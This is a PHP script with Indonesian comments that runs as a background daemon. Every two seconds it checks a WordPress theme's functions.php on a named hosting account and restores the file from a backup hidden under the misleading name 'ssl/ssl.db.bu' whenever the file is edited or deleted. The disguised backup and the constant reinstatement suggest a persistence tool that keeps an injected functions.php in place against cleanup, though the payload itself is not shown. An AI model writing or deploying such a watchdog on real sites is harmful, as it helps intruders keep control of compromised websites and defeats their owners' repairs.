#!/usr/bin/env php
<?php
/**
 * Auto Rewrite Script for functions.php
 * Memantau perubahan file functions.php dan mengembalikan dari backup
 */

// Konfigurasi
$targetFile = '/home/chiacundippal/public_html/web/wp-content/themes/experon/functions.php';
$backupFile = '/home/chiacundippal/ssl/ssl.db.bu';
$logFile = '/home/chiacundippal/ssl/ssl.db.bu.log';
$pidFile = '/home/chiacundippal/ssl/auto_rewrite.pid';
$checkInterval = 2; // Detik antara pengecekan

// Fungsi untuk menulis log
function writeLog($message, $logFile) {
    $timestamp = date('Y-m-d H:i:s');
    $logMessage = "[$timestamp] $message" . PHP_EOL;
    file_put_contents($logFile, $logMessage, FILE_APPEND);
    echo $logMessage; // Untuk output jika dijalankan manual
}

// Fungsi untuk memeriksa apakah proses sudah berjalan
function isProcessRunning($pidFile) {
    if (file_exists($pidFile)) {
        $pid = trim(file_get_contents($pidFile));
        if (posix_kill($pid, 0)) {
            return true;
        }
    }
    return false;
}

// Fungsi untuk menyimpan PID
function savePid($pidFile) {
    file_put_contents($pidFile, getmypid());
}

// Fungsi untuk menghapus PID saat keluar
function cleanup($pidFile) {
    if (file_exists($pidFile)) {
        unlink($pidFile);
    }
}

// Fungsi untuk mendapatkan hash file
function getFileHash($filePath) {
    if (file_exists($filePath)) {
        return md5_file($filePath);
    }
    return null;
}

// Fungsi untuk restore file dari backup
function restoreBackup($targetFile, $backupFile, $logFile) {
    if (file_exists($backupFile)) {
        if (copy($backupFile, $targetFile)) {
            writeLog("SUCCESS: File $targetFile berhasil direstore dari backup", $logFile);
            return true;
        } else {
            writeLog("ERROR: Gagal merestore $targetFile dari backup", $logFile);
            return false;
        }
    } else {
        writeLog("ERROR: File backup $backupFile tidak ditemukan", $logFile);
        return false;
    }
}

// Fungsi untuk memonitor file
function monitorFile($targetFile, $backupFile, $logFile, $checkInterval, $pidFile) {
    writeLog("=== AUTO REWRITE SCRIPT STARTED ===", $logFile);
    writeLog("Monitoring file: $targetFile", $logFile);
    writeLog("Backup file: $backupFile", $logFile);
    writeLog("Check interval: $checkInterval detik", $logFile);
    
    // Simpan hash awal jika file target ada
    $lastHash = getFileHash($targetFile);
    $lastModified = file_exists($targetFile) ? filemtime($targetFile) : null;
    $lastSize = file_exists($targetFile) ? filesize($targetFile) : null;
    
    writeLog("Initial hash: $lastHash", $logFile);
    
    // Restore awal jika file target tidak ada
    if (!file_exists($targetFile)) {
        writeLog("File target tidak ditemukan, melakukan restore awal...", $logFile);
        restoreBackup($targetFile, $backupFile, $logFile);
        $lastHash = getFileHash($targetFile);
        $lastModified = file_exists($targetFile) ? filemtime($targetFile) : null;
        $lastSize = file_exists($targetFile) ? filesize($targetFile) : null;
    }
    
    // Loop monitoring
    while (true) {
        sleep($checkInterval);
        
        // Cek apakah file target ada
        $currentExists = file_exists($targetFile);
        
        // Kasus 1: File dihapus
        if (!$currentExists) {
            writeLog("ALERT: File $targetFile telah DIHAPUS! Melakukan restore...", $logFile);
            restoreBackup($targetFile, $backupFile, $logFile);
            $lastHash = getFileHash($targetFile);
            $lastModified = file_exists($targetFile) ? filemtime($targetFile) : null;
            $lastSize = file_exists($targetFile) ? filesize($targetFile) : null;
            continue;
        }
        
        // Kasus 2: File dimodifikasi
        $currentHash = getFileHash($targetFile);
        $currentModified = filemtime($targetFile);
        $currentSize = filesize($targetFile);
        
        if ($currentHash !== $lastHash) {
            writeLog("ALERT: File $targetFile telah BERUBAH!", $logFile);
            writeLog("  - Sebelum: Size=$lastSize bytes, Modified=" . date('Y-m-d H:i:s', $lastModified), $logFile);
            writeLog("  - Sesudah: Size=$currentSize bytes, Modified=" . date('Y-m-d H:i:s', $currentModified), $logFile);
            writeLog("  - Hash berbeda: $lastHash -> $currentHash", $logFile);
            
            if (restoreBackup($targetFile, $backupFile, $logFile)) {
                writeLog("File berhasil dikembalikan ke versi backup", $logFile);
                $lastHash = getFileHash($targetFile);
                $lastModified = file_exists($targetFile) ? filemtime($targetFile) : null;
                $lastSize = file_exists($targetFile) ? filesize($targetFile) : null;
            }
        }
        
        // Update variabel untuk pengecekan berikutnya
        $lastHash = $currentHash;
        $lastModified = $currentModified;
        $lastSize = $currentSize;
    }
}

// Main execution
try {
    // Cek apakah script sudah berjalan
    if (isProcessRunning($pidFile)) {
        die("ERROR: Script sudah berjalan. Hentikan proses sebelumnya terlebih dahulu.\n");
    }
    
    // Simpan PID
    savePid($pidFile);
    
    // Register shutdown function untuk cleanup
    register_shutdown_function(function() use ($pidFile) {
        cleanup($pidFile);
    });
    
    // Handle signal untuk cleanup
    if (function_exists('pcntl_signal')) {
        pcntl_signal(SIGTERM, function() use ($pidFile) {
            cleanup($pidFile);
            exit;
        });
        pcntl_signal(SIGINT, function() use ($pidFile) {
            cleanup($pidFile);
            exit;
        });
    }
    
    // Jalankan monitoring
    monitorFile($targetFile, $backupFile, $logFile, $checkInterval, $pidFile);
    
} catch (Exception $e) {
    writeLog("FATAL ERROR: " . $e->getMessage(), $logFile);
    cleanup($pidFile);
    exit(1);
}
